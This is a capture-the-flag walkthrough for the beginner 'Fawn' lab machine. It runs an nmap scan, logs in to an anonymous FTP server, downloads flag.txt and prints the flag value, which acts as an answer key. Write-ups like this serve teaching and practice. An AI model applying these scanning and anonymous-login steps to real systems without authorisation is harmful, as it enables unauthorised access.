---
Title: Fawn
Difficulty: very easy
Tags: Linux, FTP, Account Misconfiguration
Tools: nmap
Author: sl0th0x87
Date: 2022/01/10
---
# Fawn

## General informations
* IP Attack Machine: 10.10.14.39
* IP Target Machine: 10.129.139.214
* Operating System: Linux

## NMAP scan
Make a portscan over all ports with service detecion
Enable NMAP scripts and disable ping scan
```bash
sudo nmap -sV -sC -Pn -p- 10.129.139.214
```

Output:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 16:32 CET
Nmap scan report for 10.129.139.214
Host is up (0.043s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.42 seconds
```

### Open ports
* 21/tcp open  ftp     vsftpd 3.0.3

## FTP
The NMAP script shows us, that anonymous login is allowed\
So connect to the server with FTP

Set a username 'anonymous' and no password
```bash
ftp 10.129.139.214
Connected to 10.129.139.214.
220 (vsFTPd 3.0.3)
Name (10.129.139.214:sl0th0x87): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Show all files in the directory
```bash
ftp> ls
229 Entering Extended Passive Mode (|||24622|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

Download the flag.txt file to your local computer
```bash
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||45685|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |**************************************************************************************************************************************************************************************************|    32      215.51 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.18 KiB/s)
ftp> quit
221 Goodbye.
```

Get the root flag
```bash
└─$ cat flag.txt                       
035db21c881520061c53e0536e44f815
```

Congratulations! You got the root flag!